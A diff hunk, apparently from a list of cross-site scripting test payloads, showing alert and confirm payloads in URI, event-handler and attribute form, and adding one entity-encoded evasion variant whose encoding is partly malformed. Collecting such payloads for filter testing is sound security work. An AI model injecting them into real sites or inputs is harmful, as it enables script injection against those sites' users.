@@ -33,3 +33,4 @@ javascript:alert('XSS')
 <details/open/onmouseover=confirm`Hello, World!`>
 <button onclick="alert('Hello, World!')">Click me</button>
 <div [x="alert`Hello, World!`"]></div>
+&emsp;&#97;&#108;&#101;&#114;&#116;&apos;&#88;&#83;&#83;&apos;&58;&#97;&#108;&#101;&#114;&#116;&apos;&#72;&#101;&#108;&#108;&#111;&#44;&emsp;&#87;&#111;&#114;&#108;&#100;&33;
